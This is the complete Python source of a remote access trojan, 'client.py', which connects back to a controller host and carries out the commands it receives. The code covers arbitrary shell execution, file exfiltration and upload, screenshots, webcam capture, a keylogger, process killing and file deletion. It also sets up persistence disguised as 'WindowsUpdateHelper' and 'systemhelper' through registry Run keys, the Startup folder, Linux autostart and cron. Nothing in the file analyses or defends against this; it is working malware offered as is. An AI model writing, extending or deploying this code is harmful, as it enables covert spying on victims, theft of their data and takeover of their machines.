# client.py – Full RAT with Extended Commands
import socket
import subprocess
import os
import sys
import platform
import threading
import time
import mss
import io
import glob
import shutil
import getpass
import psutil
import winreg
from PIL import Image

class FullRAT:
    def __init__(self, host='127.0.0.1', port=5555):
        self.host = host
        self.port = port

    def execute_system_cmd(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "[-] Command timeout"
        except Exception as e:
            return str(e)

    def download_file(self, path):
        if not os.path.exists(path):
            return b"[-] File not found"
        try:
            with open(path, 'rb') as f:
                return f.read()
        except Exception as e:
            return f"[-] Error: {e}".encode()

    def upload_file_handler(self, conn):
        data = b""
        while True:
            chunk = conn.recv(8192)
            if chunk == b"__ENDOFFILE__":
                break
            data += chunk
        filename = f"uploaded_{int(time.time())}"
        with open(filename, 'wb') as f:
            f.write(data)
        return "[+] Upload received"

    def take_screenshot(self):
        try:
            with mss.mss() as sct:
                screenshot = sct.grab(sct.monitors[1])
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                buffer = io.BytesIO()
                img.save(buffer, format="PNG")
                return buffer.getvalue()
        except Exception as e:
            return f"[-] Screenshot failed: {e}".encode()

    def list_directory(self, path="."):
        try:
            items = os.listdir(path)
            result = f"\nDirectory: {os.path.abspath(path)}\n"
            result += "-" * 50 + "\n"
            for item in items:
                full_path = os.path.join(path, item)
                if os.path.isdir(full_path):
                    result += f"[DIR]  {item}\n"
                else:
                    size = os.path.getsize(full_path)
                    result += f"[FILE] {item} ({size} bytes)\n"
            return result
        except Exception as e:
            return f"[-] Error: {e}"

    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"[+] Changed to: {os.getcwd()}"
        except Exception as e:
            return f"[-] Error: {e}"

    def get_current_directory(self):
        return f"[CWD] {os.getcwd()}"

    def delete_file(self, path):
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
                return f"[+] Deleted directory: {path}"
            else:
                os.remove(path)
                return f"[+] Deleted file: {path}"
        except Exception as e:
            return f"[-] Error: {e}"

    def process_list(self):
        try:
            result = "\nRunning Processes:\n" + "-" * 50 + "\n"
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    result += f"PID: {proc.info['pid']:6} | Name: {proc.info['name']:20} | User: {proc.info['username']}\n"
                except:
                    continue
            return result
        except Exception as e:
            return f"[-] Error: {e}"

    def kill_process(self, pid):
        try:
            proc = psutil.Process(int(pid))
            proc.terminate()
            return f"[+] Terminated process: {pid}"
        except Exception as e:
            return f"[-] Error: {e}"

    def get_system_info(self):
        info = []
        info.append(f"Hostname: {platform.node()}")
        info.append(f"OS: {platform.system()} {platform.release()}")
        info.append(f"Architecture: {platform.machine()}")
        info.append(f"User: {os.getlogin()}")
        info.append(f"Current Directory: {os.getcwd()}")
        info.append(f"CPU Cores: {psutil.cpu_count()}")
        info.append(f"RAM: {psutil.virtual_memory().total // (1024**3)} GB")
        info.append(f"Disk Free: {psutil.disk_usage('/').free // (1024**3)} GB")
        info.append(f"IP Addresses: {socket.gethostbyname_ex(socket.gethostname())[2]}")
        return "\n".join(info)

    def keylog_start(self):
        try:
            from pynput import keyboard
            self.logging = True
            self.log_buffer = []
            
            def on_press(key):
                try:
                    self.log_buffer.append(key.char)
                except AttributeError:
                    self.log_buffer.append(f'[{key}]')
                if len(self.log_buffer) > 100:
                    self.flush_logs()
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            return "[+] Keylogger started"
        except ImportError:
            return "[-] Install pynput: pip install pynput"
        except Exception as e:
            return f"[-] Error: {e}"

    def keylog_stop(self):
        try:
            self.logging = False
            self.listener.stop()
            logs = ''.join(self.log_buffer)
            with open(f"keylog_{int(time.time())}.txt", 'w') as f:
                f.write(logs)
            self.log_buffer = []
            return f"[+] Keylogger stopped. Logs saved. Length: {len(logs)} chars"
        except:
            return "[-] Keylogger not running"

    def keylog_dump(self):
        if hasattr(self, 'log_buffer') and self.log_buffer:
            logs = ''.join(self.log_buffer)
            return f"[Keylog] {logs[-500:]}"  # Return last 500 chars
        return "[-] No keylogs available"

    def webcam_capture(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                cap.release()
                return buffer.tobytes()
            cap.release()
            return b"[-] Webcam failed"
        except ImportError:
            return b"[-] Install opencv-python: pip install opencv-python"
        except Exception as e:
            return f"[-] Error: {e}".encode()

    def persistence_install(self):
        try:
            if platform.system() == "Windows":
                # Registry persistence
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "WindowsUpdateHelper", 0, winreg.REG_SZ, sys.executable + " " + __file__)
                
                # Startup folder
                startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', 'systemhelper.pyw')
                with open(startup, 'w') as f:
                    f.write(open(__file__).read())
                return "[+] Persistence installed (Registry + Startup)"
            
            elif platform.system() == "Linux":
                rc_path = os.path.expanduser("~/.config/autostart/systemhelper.desktop")
                os.makedirs(os.path.dirname(rc_path), exist_ok=True)
                with open(rc_path, 'w') as f:
                    f.write(f"[Desktop Entry]\nType=Application\nExec=python3 {os.path.abspath(__file__)}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=SystemHelper")
                
                cron_line = f"@reboot python3 {os.path.abspath(__file__)}"
                with open("/tmp/crontab_temp", 'w') as f:
                    subprocess.run(["crontab", "-l"], stdout=f)
                with open("/tmp/crontab_temp", 'a') as f:
                    f.write(cron_line + "\n")
                subprocess.run(["crontab", "/tmp/crontab_temp"])
                return "[+] Persistence installed (Autostart + Cron)"
            return "[-] Unsupported OS"
        except Exception as e:
            return f"[-] Persistence error: {e}"

    def handle_command(self, conn, cmd):
        cmd_parts = cmd.strip().split()
        if not cmd_parts:
            return ""

        base_cmd = cmd_parts[0].lower()

        if base_cmd == "download" and len(cmd_parts) > 1:
            file_data = self.download_file(cmd_parts[1])
            conn.sendall(file_data)
            conn.sendall(b"__ENDOFFILE__")
            return "File sent"

        elif base_cmd == "upload" and len(cmd_parts) > 1:
            return self.upload_file_handler(conn)

        elif base_cmd == "screenshot":
            img_data = self.take_screenshot()
            conn.sendall(img_data)
            conn.sendall(b"__END__")
            return "Screenshot sent"

        elif base_cmd == "webcam":
            img_data = self.webcam_capture()
            conn.sendall(img_data)
            conn.sendall(b"__END__")
            return "Webcam capture sent"

        elif base_cmd == "ls" or base_cmd == "dir":
            path = cmd_parts[1] if len(cmd_parts) > 1 else "."
            return self.list_directory(path)

        elif base_cmd == "cd" and len(cmd_parts) > 1:
            return self.change_directory(cmd_parts[1])

        elif base_cmd == "pwd":
            return self.get_current_directory()

        elif base_cmd == "rm" or base_cmd == "del":
            if len(cmd_parts) > 1:
                return self.delete_file(cmd_parts[1])
            return "[-] Specify path"

        elif base_cmd == "ps":
            return self.process_list()

        elif base_cmd == "kill" and len(cmd_parts) > 1:
            return self.kill_process(cmd_parts[1])

        elif base_cmd == "info":
            return self.get_system_info()

        elif base_cmd == "keylog_start":
            return self.keylog_start()

        elif base_cmd == "keylog_stop":
            return self.keylog_stop()

        elif base_cmd == "keylog_dump":
            return self.keylog_dump()

        elif base_cmd == "persist":
            return self.persistence_install()

        elif base_cmd == "exit":
            conn.sendall(b"exit")
            return ""

        else:
            return self.execute_system_cmd(cmd)

    def connect(self):
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.host, self.port))
                    while True:
                        cmd = s.recv(65536).decode()
                        if not cmd or cmd == "exit":
                            return
                        response = self.handle_command(s, cmd)
                        if response:
                            if isinstance(response, str):
                                s.sendall(response.encode())
            except (ConnectionRefusedError, ConnectionResetError):
                time.sleep(5)
                continue

if __name__ == '__main__':
    rat = FullRAT()
    rat.connect()